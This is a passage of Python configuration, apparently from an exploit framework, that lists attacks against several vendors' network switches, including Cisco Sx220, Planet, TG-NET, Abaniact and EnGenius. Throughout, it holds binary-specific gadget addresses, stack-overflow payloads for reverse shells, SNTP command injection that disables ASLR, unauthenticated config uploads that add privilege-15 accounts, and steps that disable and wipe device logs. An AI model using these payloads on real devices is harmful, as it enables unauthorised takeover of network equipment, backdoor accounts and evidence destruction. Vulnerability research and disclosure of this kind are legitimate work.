    'sys_timeSntpDel_set':0x415F14,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSettings_set':0x415F14,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': False,#
    },
    'heack_cgi_shell': {
    'cgi':'set.cgi',# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
    'START':0x7ffeff04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 77,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # Abaniact
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : No
    # Del /mntlog/flash.log  : No
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '222-45866': {
    'template':'Abaniact',# Static for the vendor
    'version':'116B00033',# Version / binary dependent stuff
    'model':'AML2-PS16-17GP L2',# Model
    'uri':'https://www.abaniact.com/L2SW/',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E65C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f998524,# la $t9, system) # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x2484152c,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_diag': {
    # Ping IPv4
    #'sys_ping_post_cmd':'ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space&count=1',
    #'verify_uri':'/tmp/pingtest_tmp',
    #'web_sys_ping_post':0x4296FC,# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_ping_post()
    
    # traceroute
    'web_sys_ping_post':0x429F58,# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_trace_route_post()
    'sys_ping_post_cmd':'ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/traceroute_tmp #&tr_maxhop=30&count=1',
    'verify_uri':'/tmp/traceroute_tmp',
    'vulnerable': True,
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
    'log_settings_set':0x4B4FE4,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_ramClear':0x4BA5D0,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_fileClear':0x4BA5D0,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'stack_cgi_sntp': {
    'sys_timeSntp_set':0x43764C,# Jump one after 'sw $ra'# Set SNTP Server (Inject CMD)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntpDel_set':0x43764C,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
    'sys_timeSettings_set':0x431CC4,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': False,
    },
    'heack_cgi_shell': {
    'cgi':'dispatcher.cgi',# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
    'query':'username=admin&password=_PWDNOP_RA_START&login=1&shellcod=_USRNOP_USRNOP_USRNOP_SHELLCODE',
    'START':0x7ffe6e04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'usr_nop': 53,# NOP sled (shellcode will be tailed)
    'pwd_nop': 45,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'vulnerable': True,
    'workaround':True,# My LAB workaround
    
    },
    },
    },
    
    #
    # TG-NET Botone Technology Co.,Ltd.
    # (Traces in this image: 3One Data Communication, Saitian, Sangfor, Sundray, Gigamedia, GetCK, Hanming Technology)
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : No
    # Del /mntlog/flash.log  : No
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '222-81176': {
    'template':'TG-NET',# Static for the vendor
    'version':'3.1.1-R1',# Version / binary dependent stuff
    'model':'P3026M-24POE (V3)',# Model
    'uri':'http://www.tg-net.net/productshow.asp?ProdNum=1049&parentid=98',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40C74C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system) # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x2484a2d4,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_diag': {
    'vulnerable': False,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
    'log_settings_set':0x46AC10,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_ramClear':0x46E368,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_fileClear':0x46E368,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntp_set':0x42243C,# Jump one after 'sw $ra'# Set SNTP Server (Inject CMD)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntpDel_set':0x42243C,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
    'sys_timeSettings_set':0x424DE0,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    
    'vulnerable':False,
    },
    
    # Interesting when there is a fresh heap with 0x00's (4 x 0x00 == MIPS NOP),
    # and to fill wider area with sending '&%8f%84%01=%8f%84%80%18' where:
    #
    # NOP's
    # '24%04%FF=' : '=' will be replaced with 0x00, li $a0, 0xFFFFFF00
    # '%24%04%FF%FF' : li $a0, 0xFFFFFFFF
    'heack_cgi_shell': {
    'cgi':'dispatcher.cgi',# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
    'query':'username='+ self.random_string(112) +'_RA_START&password='+ self.random_string(80) +'&login=1'+ ('&%24%04%FF=%24%04%FF%FF' * 50) +'_SHELLCODE',
    'START':0x10010104,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP' :0x10600604,# end: You may want to play with this if you dont get it working
    'usr_nop': 28,# NOP sled (shellcode will be tailed)
    'pwd_nop': 20,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':False,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    }
    
    #
    # Vendor templates, Vendor_ETag() will be merged to here
    # (dont delete anything here thats not moved to Vendor_ETag())
    #
    
    Vendor_Template = {
    #
    'Planet': {
    'vendor': 'PLANET Technology Corp.',
    'modulus_uri':'',
    'info_leak':False,
    'info_leak_JSON':False,
    'info_leak_uri':'',
    'xsid':False,
    'xsid_uri':'',
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':False,
    'encryption':'clear',
    'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'query':'username=USERNAME&password=PASSWORD&login=1',
    'status_uri':'/cgi-bin/dispatcher.cgi?cmd=547',
    'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
    'vulnerable': True,
    'safe': True
    },
    'log':{
    'description':'Disable and clean logs',
    'authenticated': True,
    'json':False,
    'disable_uri':'/cgi-bin/dispatcher.cgi',
    'disable_query':'LOGGING_SERVICE=0&cmd=5121',
    'status':'',
    'clean_logfile_uri':'/cgi-bin/dispatcher.cgi',
    'clean_logfile_query':'cmd_5132=Clear+file+messages',
    'clean_logmem_uri':'/cgi-bin/dispatcher.cgi',
    'clean_logmem_query':'cmd_5132=Clear+buffered+messages',
    'vulnerable': True,
    'safe': True
    },
    # Verify lacking authentication
    'verify': {
    'httpuploadbakcfg.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpuploadbakcfg.cgi',
    'check_uri':'',
    'content':'dummy',
    'content_check':' Invalid config file!!', # one 0x20 in beginning
    'vulnerable': True,
    'safe': True
    },
    'httpuploadruncfg.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpuploadruncfg.cgi',
    'check_uri':'',
    'content':'dummy',
    'content_check':' Invalid config file!!', # one 0x20 in beginning
    'vulnerable': True,
    'safe': True
    },
    'httprestorecfg.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httprestorecfg.cgi',
    'check_uri':'',
    'content':'dummy',
    'content_check':' Invalid config file!!', # one 0x20 in beginning
    'vulnerable': True,
    'safe': True
    },
    'httpupload.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpupload.cgi',
    'check_uri':'',
    'content':'dummy',
    'content_check':'Image Signature Error',
    'vulnerable': True,
    'safe': True
    },
    'dispatcher.cgi': { # 'username' also suffer from stack overflow
    'description':'Stack overflow in "username/password" (PoC: crash CGI)',
    'response':'502',
    'Content-Type':False,
    'authenticated': False,
    'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'content':'username=admin&password='+ self.random_string(184) + '&login=1',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
    'authenticated': False,
    'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
    'vulnerable': True,
    'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
    },
    'priv15_account': {
    'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
    'json':False,
    'authenticated': False,
    'encryption':'md5',
    'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" secret encrypted PASSWORD\n\n------',
    #'encryption':'nopassword',
    #'content':'Content-Type\n\nconfig-file-header\nusername "USERNAME" nopassword\n\n------', # Yep, working too
    'add_uri':'/cgi-bin/httpuploadruncfg.cgi',
    'del_query':'',
    'del_uri':'/cgi-bin/dispatcher.cgi?cmd=526&usrName=USERNAME',
    'vulnerable': True,
    'safe': True
    },
    'sntp': {
    'description':'SNTP command injection (PoC: disable ASLR)',
    'json':False,
    'authenticated': True,
    'enable_uri':'/cgi-bin/dispatcher.cgi',
    'enable_query':'sntp_enable=1&cmd=548',
    'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
    'inject_uri':'/cgi-bin/dispatcher.cgi',
    'inject_query':'sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123&cmd=550',
    'check_query':'sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123&cmd=550',
    'delete_uri':'/cgi-bin/dispatcher.cgi',
    'delete_query':'sntp_Server=+&sntp_Port=123&cmd=550',
    'disable_uri':'/cgi-bin/dispatcher.cgi',
    'disable_query':'sntp_enable=0&cmd=548',
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    #
    # The stack overflow in 'username' and 'password' at same request are multipurpose.
    #
    
    #
    # The trick to jump and execute:
    # 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
    # 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
    # 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
    # 4. We will also feed required function parameters, by adding them to '_CMD_'
    #
    'stack_cgi_diag': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    
    'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'content':'username='+ self.random_string(212) +'_JUMP_&password='+ self.random_string(180) +'&_CMD_&login=1',
    'sys_ping_post_check':'',
    'sys_ping_post_SIGSEGV': False,# SIGSEGV ?
    
    'workaround':True,# My LAB workaround
    
    'vulnerable': True,
    'safe': True
    
    },
    'stack_cgi_log': {
    'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
    'authenticated': False,
    'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'content':'username='+ self.random_string(212) +'_JUMP_&password='+ self.random_string(180) +'_CMD_&login=1',
    
    'log_settings_set_cmd':'&LOGGING_SERVICE=0',# Disable Logging CMD
    'log_settings_set_SIGSEGV':False,# Disable Logging SIGSEGV ?
    
    'log_ramClear_cmd':'',# Clean RAM log CMD
    'log_ramClear_SIGSEGV':False,# Clean RAM log SIGSEGV ?
    
    'log_fileClear_cmd':'',# Clean FILE log CMD
    'log_fileClear_SIGSEGV':False,# Clean FILE log SIGSEGV ?
    
    'workaround':True,# My LAB workaround
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_sntp': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'content':'username='+ self.random_string(212) +'_JUMP_&password='+ self.random_string(180) +'_CMD_&login=1',
    
    'sys_timeSntp_set_cmd':'&sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123',
    'sys_timeSntp_set_check':'&sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123',
    
    'sys_timeSntpDel_set_cmd':'&sntp_Server=+&sntp_Port=123',
    
    'sys_timeSettings_set_cmd_enable':'&sntp_enable=1',
    'sys_timeSettings_set_cmd_disable':'&sntp_enable=0',
    'sys_timeSettings_set_SIGSEGV': False,# SIGSEGV ?
    
    'workaround':True,# My LAB workaround
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    
    #
    # After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
    # Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
    #
    'heack_cgi_shell': {
    'description':'Stack overflow in "username/password" (PoC: reverse shell)',
    'authenticated': False,
    'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
    'query':'username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&login=1',
    'workaround':True,# My LAB workaround
    'stack':True, # False = use Heap, and there are no ASLR
    'vulnerable': True,
    'safe': True
    },
    
    },
    },
    
    'Cisco': {
    'vendor': 'Cisco Systems, Inc.',
    'model':'Sx220',
    'uri':'https://www.cisco.com/c/en/us/support/switches/small-business-220-series-smart-plus-switches/tsd-products-support-series-home.html',
    'modulus_uri':'/cgi/get.cgi?cmd=home_login',
    'info_leak':True,
    'info_leak_JSON':True,
    'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
    'xsid':True,
    'xsid_uri':'/cgi/get.cgi?cmd=home_main',
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':True,
    'encryption':'rsa',
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
    'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
    'logout_uri':'/cgi/set.cgi?cmd=home_logout',
    'vulnerable': True,
    'safe': True
    },
    'log':{
    'description':'Disable and clean logs',
    'authenticated': True,
    'json':True,
    'disable_uri':'/cgi/set.cgi?cmd=log_settings',
    'disable_query':'{"_ds=1&ram_sev_0=on&ram_sev_1=on&ram_sev_2=on&ram_sev_3=on&ram_sev_4=on&ram_sev_5=on&ram_sev_6=on&_de=1":{}}',
    'status':'/cgi/get.cgi?cmd=log_settings',
    'clean_logfile_uri':'/cgi/set.cgi?cmd=log_fileClear',
    'clean_logfile_query':'{"":{}}',
    'clean_logmem_uri':'/cgi/set.cgi?cmd=log_ramClear',
    'clean_logmem_query':'{"":{}}',
    'vulnerable': True,
    'safe': True
    },
    # Verify lacking authentication
    'verify': {
    'httpuploadbakcfg.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi/httpuploadbakcfg.cgi',
    'check_uri':'/tmp/startup-config',
    'content':'/mnt/backup-config',
    'content_check':'/mnt/backup-config',
    'vulnerable': True,
    'safe': True
    },
    'httpuploadlang.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload/update "language" (PoC: Create invalid file to verify)',
    'uri':'/cgi/httpuploadlang.cgi',
    'check_uri':False,#
    'content': self.random_string(30), # We checking returned 'errMsgLangMG' and LEN of this text
    'content_check':'errMsgLangMG',#
    'vulnerable': True,
    'safe': True
    },
    'httpuploadruncfg.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi/httpuploadruncfg.cgi',
    'check_uri':'/tmp/http_saverun_cfg',
    'content':'/var/config/running-config',
    'content_check':'/var/config/running-config',
    'vulnerable': True,
    'safe': True
    },
    'httprestorecfg.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi/httprestorecfg.cgi',
    'check_uri':'/tmp/startup-config',
    'content':'/mnt/startup-config',
    'content_check':'/mnt/startup-config',
    'vulnerable': True,
    'safe': True
    },
    'httpupload.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpupload.cgi',
    'check_uri':'/tmp/http_uploadfail',
    'content':'Copy: Illegal software format', # Not the real content, its the result of invalid firmware (workaround)
    'content_check':'Copy: Illegal software format',
    'vulnerable': True,
    'safe': True
    },
    'login.cgi': {
    'description':'Stack overflow in login.cgi (PoC: create file /tmp/VUL.TXT)',
    'authenticated': False,
    'response':'file',
    'Content-Type':False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'check_uri':'/tmp/VUL.TXT', # We cannot control the content...
    'content':'{"_ds=1&username='+ self.random_string(32) +'&password=/tmp/VUL.TXT&_de=1":{}}',
    'content_check':'2',
    'vulnerable': True,
    'safe': True
    },
    'set.cgi': { # 'username' also suffer from stack overflow
    'description':'Stack overflow in "username/password" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
    'authenticated': False,
    'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
    'vulnerable': True,
    'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
    },
    'priv15_account': {
    'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
    'authenticated': False,
    'json':True,
    'encryption':'md5',
    'content':'Content-Type\n\nconfig-file-header\nusername "USERNAME" secret encrypted PASSWORD\n\n------',
    #'encryption':'nopassword',
    #'content':'Content-Type\n\nconfig-file-header\nusername "USERNAME" nopassword\n\n------', # Yep, working too
    'add_uri':'/cgi/httpuploadruncfg.cgi',
    'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
    'del_uri':'/cgi/set.cgi?cmd=aaa_userDel',
    'vulnerable': True,
    'safe': True
    },
    'sntp': {
    'description':'SNTP command injection (PoC: disable ASLR)',
    'json':True,
    'authenticated': True,
    'enable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
    'enable_query':'{"_ds=1&sntpStatus=1&_de=1":{}}',
    'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
    'inject_uri':'/cgi/set.cgi?cmd=sys_timeSntp',
    'inject_query':'{"_ds=1&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123&_de=1":{}}',
    'check_query':'{"_ds=1&srvDef=byIp&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123&_de=1":{}}',
    'delete_uri':'/cgi/set.cgi?cmd=sys_timeSntpDel',
    'delete_query':'{"":{}}',
    'disable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
    'disable_query':'{"_ds=1&sntpStatus=0&_de=1":{}}',
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    #
    # The stack overflow in 'username' and 'password' at same request are multipurpose.
    #
    
    #
    # The trick to jump and execute:
    # 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
    # 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
    # 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
    # 4. We will also feed required function parameters, by adding them to '_CMD_'
    #
    'stack_cgi_diag': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
    'sys_ping_post_SIGSEGV': True,# SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    
    },
    'stack_cgi_log': {
    'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
    'authenticated': False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
    
    'log_settings_set_cmd':'',# Disable Logging CMD
    'log_settings_set_SIGSEGV':True,# Disable Logging SIGSEGV ?
    
    'log_ramClear_cmd':'',# Clean RAM CMD
    'log_ramClear_SIGSEGV':True,# Clean RAM SIGSEGV ?
    
    'log_fileClear_cmd':'',# Clean FILE log CMD
    'log_fileClear_SIGSEGV':True,# Clean FILE log SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'',
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_sntp': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
    'sys_timeSntp_set_cmd':'&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123',
    'sys_timeSntp_set_check':'&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123',
    
    'sys_timeSntpDel_set_cmd':'&sntpServer=+&cursntpPort=123',# CMD
    
    'sys_timeSettings_set_cmd_enable':'&sntpStatus=1',# Enable CMD
    'sys_timeSettings_set_cmd_disable':'&sntpStatus=0',# Disable CMD
    'sys_timeSettings_set_SIGSEGV': True,# SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    #
    # After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
    # Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
    #
    'heack_cgi_shell': {
    'description':'Stack overflow in "username/password" (PoC: reverse shell)',
    'authenticated': False,
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'logout_uri':'/cgi/set.cgi?cmd=home_logout',
    'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
    'stack':True, # False = use Heap, and there are no ASLR
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    },
    
    },
    },
    
    'EnGenius': {
    'vendor': 'EnGenius Technologies, Inc.',
    'modulus_uri':'',
    'info_leak':True,
    'info_leak_JSON':False,
    'info_leak_uri':'/loginMsg.js',
    'xsid':False,
    'xsid_uri':'',
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':True,
    'encryption':'',
    'login_uri':'',
    'query':'',
    'status_uri':'',
    'logout_uri':'',
    'vulnerable': False,
    'safe': True
    },
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':True,
    'encryption':'',
    'login_uri':'',
    'query':'',
    'status_uri':'',
    'logout_uri':'',
    'vulnerable': False,
    'safe': True
    },
    'log':{
    'description':'Disable and clean logs',
    'authenticated': True,
    'json':True,
    'disable_uri':'',
    'disable_query':'',
    'status':'',
    'clean_logfile_uri':'',
    'clean_logfile_query':'',
    'clean_logmem_uri':'',
    'clean_logmem_query':'',
    'vulnerable': False,
    'safe': True
    },
    # Verify lacking authentication
    'verify': {
    'security.cgi': { # 'username' also suffer from stack overflow
    'description':'Stack overflow in "username/password" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/security.cgi?login',
    'content':'usr=admin&pswrd=' + self.random_string(280),
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'datajson.cgi': { # 'username' also suffer from stack overflow
    'description':'Stack overflow in "username/password" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr=admin&pswrd=' + self.random_string(288),
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
    'authenticated': False,
    'uri':'/cgi-bin/sn_httpupload.cgi?', # Including alignment of opcodes in memory
    'vulnerable': True,
    'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
    },
    'priv15_account': {
    'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
    'authenticated': False,
    'json':True,
    'encryption':'',
    'content':'',
    'add_uri':'',
    'del_query':'',
    'del_uri':'',
    'vulnerable': False,
    'safe': True
    },
    'sntp': {
    'description':'SNTP command injection (PoC: disable ASLR)',
    'json':True,
    'authenticated': True,# <================================
    'enable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
    'enable_query':'{"_ds=1&sntpStatus=1&_de=1":{}}',
    'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
    'inject_uri':'/cgi/set.cgi?cmd=sys_timeSntp',
    'inject_query':'{"_ds=1&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123&_de=1":{}}',
    'check_query':'{"_ds=1&srvDef=byIp&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123&_de=1":{}}',
    'delete_uri':'/cgi/set.cgi?cmd=sys_timeSntpDel',
    'delete_query':'{"":{}}',
    'disable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
    'disable_query':'{"_ds=1&sntpStatus=0&_de=1":{}}',
    'verify_uri':'/tmp/check',
    'vulnerable': False, # It is vulnerable, but I am not using this authenticated code here :>
    'safe': True
    },
    #
    # The stack overflow in 'username' and 'password' at same request are multipurpose.
    #
    
    #
    # The trick to jump and execute:
    # 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
    # 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
    # 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
    # 4. We will also feed required function parameters, by adding them to '_CMD_'
    #
    # Bonus: Disable and clean logs
    #
    #
    'stack_cgi_add_account': {
    'description':'Stack overflow in "username/password" (PoC: add priv 15 credentials)',
    'authenticated': False,
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
    
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_del_account': {
    'description':'Stack overflow in "username/password" (PoC: del priv 15 credentials)',
    'authenticated': False,
